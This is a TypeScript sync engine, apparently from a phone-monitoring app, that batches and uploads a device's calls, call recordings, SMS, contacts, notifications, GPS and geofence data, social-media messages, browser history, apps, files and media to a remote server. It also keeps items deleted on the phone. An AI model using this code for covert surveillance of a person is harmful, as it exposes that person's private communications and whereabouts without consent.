import { deviceApi } from '@/lib/api'
import { executeAsync } from '@/db/database'
import { DeviceStorage } from '@/lib/storage'
import { SyncStore } from '@/lib/sync-store'
import type {
  SyncPayload,
  SyncResponse,
  SyncCall,
  SyncSms,
  SyncContact,
  SyncNotification,
  SyncGpsLocation,
  SyncGeofenceAlert,
  SyncSocialMessage,
  SyncBrowserHistory,
  SyncInstalledApp,
  SyncFile,
  SyncMedia,
} from '@/types/sync'

const BATCH_LIMIT = 500
const MAX_SYNC_ITERATIONS = 50

type DbRow = Record<string, unknown>

async function readPending(table: string): Promise<DbRow[]> {
  const result = await executeAsync(
    `SELECT * FROM ${table} WHERE local_status = 'pending' ORDER BY id ASC LIMIT ?`,
    [BATCH_LIMIT],
  )
  return result.rows
}

async function markCompleted(table: string, hashes: string[]): Promise<void> {
  if (hashes.length === 0) return
  const placeholders = hashes.map(() => '?').join(', ')
  await executeAsync(
    `UPDATE ${table} SET local_status = 'completed' WHERE sync_hash IN (${placeholders})`,
    hashes,
  )
}

async function countPending(): Promise<number> {
  const tables = [
    'calls', 'sms', 'contacts', 'notifications', 'gps_locations',
    'geofence_alerts', 'social_messages', 'browser_history',
    'installed_apps', 'files', 'media',
  ]
  const counts = await Promise.all(
    tables.map(t =>
      executeAsync(`SELECT COUNT(*) as n FROM ${t} WHERE local_status = 'pending'`, []).then(
        r => (r.rows[0]?.n as number) ?? 0,
      ),
    ),
  )
  return counts.reduce((a, b) => a + b, 0)
}

// ── Row mappers ───────────────────────────────────────────────────────────────

function mapCall(r: DbRow): SyncCall {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    phone_number: r.phone_number as string,
    contact_name: (r.contact_name as string | null) ?? null,
    call_type: r.call_type as SyncCall['call_type'],
    duration: r.duration as number,
    recorded_at: r.recorded_at as string,
    call_recorded: Boolean(r.call_recorded),
    recording_path: (r.recording_path as string | null) ?? null,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapSms(r: DbRow): SyncSms {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    address: r.address as string,
    body: r.body as string,
    type: r.type as SyncSms['type'],
    date: r.date as string,
    sms_status: (r.sms_status as SyncSms['sms_status']) ?? undefined,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapContact(r: DbRow): SyncContact {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    name: r.name as string,
    phone_number: r.phone_number as string,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapNotification(r: DbRow): SyncNotification {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    package_name: r.package_name as string,
    title: (r.title as string | null) ?? null,
    body: (r.body as string | null) ?? null,
    date: r.date as string,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapGpsLocation(r: DbRow): SyncGpsLocation {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    latitude: r.latitude as number,
    longitude: r.longitude as number,
    altitude: (r.altitude as number | null) ?? null,
    accuracy: (r.accuracy as number | null) ?? null,
    recorded_at: r.recorded_at as string,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapGeofenceAlert(r: DbRow): SyncGeofenceAlert {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    geofence_id: r.geofence_id as number,
    event_type: r.event_type as SyncGeofenceAlert['event_type'],
    latitude: r.latitude as number,
    longitude: r.longitude as number,
    triggered_at: r.triggered_at as string,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapSocialMessage(r: DbRow): SyncSocialMessage {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    platform: r.platform as SyncSocialMessage['platform'],
    sender_name: r.sender_name as string,
    message: r.message as string,
    date: r.date as string,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapBrowserHistory(r: DbRow): SyncBrowserHistory {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    url: r.url as string,
    title: (r.title as string | null) ?? null,
    visited_at: r.visited_at as string,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapInstalledApp(r: DbRow): SyncInstalledApp {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    app_name: r.app_name as string,
    package_name: r.package_name as string,
    installed_at: (r.installed_at as string | null) ?? null,
    is_blocked: Boolean(r.is_blocked),
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapFile(r: DbRow): SyncFile {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    path: r.path as string,
    file_name: r.file_name as string,
    file_size: r.file_size as number,
    is_directory: Boolean(r.is_directory),
    file_created_at: (r.file_created_at as string | null) ?? null,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

function mapMedia(r: DbRow): SyncMedia {
  return {
    sync_hash: r.sync_hash as string,
    local_sqlite_id: r.id as number,
    media_type: r.media_type as SyncMedia['media_type'],
    origin_app: r.origin_app as string,
    file_name: r.file_name as string,
    file_size: r.file_size as number,
    path: r.path as string,
    deleted_at_source: Boolean(r.deleted_at_source),
  }
}

// ── Public API ────────────────────────────────────────────────────────────────

export type SyncResult = {
  success: boolean
  totalSent: number
  totalCleared: number
  error?: string
}

let _syncing = false
let _syncStartedAt = 0
const SYNC_LOCK_TIMEOUT = 120_000

export const SyncEngine = {
  isSyncing(): boolean {
    if (_syncing && Date.now() - _syncStartedAt > SYNC_LOCK_TIMEOUT) {
      console.warn('[SyncEngine] Lock expired after 2min — force-releasing')
      _syncing = false
    }
    return _syncing
  },

  forceReleaseLock(): void {
    console.log('[SyncEngine] Force lock release requested')
    _syncing = false
    _syncStartedAt = 0
    SyncStore.setSyncStatus('idle')
  },

  async sync(): Promise<SyncResult> {
    if (SyncEngine.isSyncing()) {
      return { success: false, totalSent: 0, totalCleared: 0, error: 'Already syncing' }
    }
    if (!DeviceStorage.isRegistered()) {
      return { success: false, totalSent: 0, totalCleared: 0, error: 'Device not registered' }
    }

    _syncing = true
    _syncStartedAt = Date.now()
    SyncStore.setSyncStatus('syncing')

    let grandTotalSent = 0
    let grandTotalCleared = 0

    try {
      for (let iteration = 0; iteration < MAX_SYNC_ITERATIONS; iteration++) {
        const [
          callRows, smsRows, contactRows, notifRows,
          gpsRows, geofenceRows, socialRows, browserRows,
          appRows, fileRows, mediaRows,
        ] = await Promise.all([
          readPending('calls'),
          readPending('sms'),
          readPending('contacts'),
          readPending('notifications'),
          readPending('gps_locations'),
          readPending('geofence_alerts'),
          readPending('social_messages'),
          readPending('browser_history'),
          readPending('installed_apps'),
          readPending('files'),
          readPending('media'),
        ])

        const payload: SyncPayload = {}
        if (callRows.length > 0) payload.calls = callRows.map(mapCall)
        if (smsRows.length > 0) payload.sms = smsRows.map(mapSms)
        if (contactRows.length > 0) payload.contacts = contactRows.map(mapContact)
        if (notifRows.length > 0) payload.notifications = notifRows.map(mapNotification)
        if (gpsRows.length > 0) payload.gps_locations = gpsRows.map(mapGpsLocation)
        if (geofenceRows.length > 0) payload.geofence_alerts = geofenceRows.map(mapGeofenceAlert)
        if (socialRows.length > 0) payload.social_messages = socialRows.map(mapSocialMessage)
        if (browserRows.length > 0) payload.browser_history = browserRows.map(mapBrowserHistory)
        if (appRows.length > 0) payload.installed_apps = appRows.map(mapInstalledApp)
        if (fileRows.length > 0) payload.files = fileRows.map(mapFile)
        if (mediaRows.length > 0) payload.media = mediaRows.map(mapMedia)

        const batchSent = Object.values(payload).reduce((sum, arr) => sum + (arr?.length ?? 0), 0)

        if (batchSent === 0) break

        const response = await deviceApi.post<SyncResponse>('/device/sync', payload)
        const { cleared } = response.data

        await Promise.all([
          markCompleted('calls', cleared.calls ?? []),
          markCompleted('sms', cleared.sms ?? []),
          markCompleted('contacts', cleared.contacts ?? []),
          markCompleted('notifications', cleared.notifications ?? []),
          markCompleted('gps_locations', cleared.gps_locations ?? []),
          markCompleted('geofence_alerts', cleared.geofence_alerts ?? []),
          markCompleted('social_messages', cleared.social_messages ?? []),
          markCompleted('browser_history', cleared.browser_history ?? []),
          markCompleted('installed_apps', cleared.installed_apps ?? []),
          markCompleted('files', cleared.files ?? []),
          markCompleted('media', cleared.media ?? []),
        ])

        const batchCleared = Object.values(cleared).reduce(
          (sum, arr) => sum + (arr?.length ?? 0),
          0,
        )

        grandTotalSent += batchSent
        grandTotalCleared += batchCleared

        if (batchSent < BATCH_LIMIT) break
      }

      const remaining = await countPending()
      SyncStore.setPendingCount(remaining)
      SyncStore.setLastSyncAt(new Date().toISOString())
      SyncStore.setSyncStatus('idle')
      DeviceStorage.setLastSyncAt(new Date().toISOString())

      return { success: true, totalSent: grandTotalSent, totalCleared: grandTotalCleared }
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err)
      SyncStore.setSyncStatus('error')
      return { success: false, totalSent: grandTotalSent, totalCleared: grandTotalCleared, error: message }
    } finally {
      _syncing = false
    }
  },
}
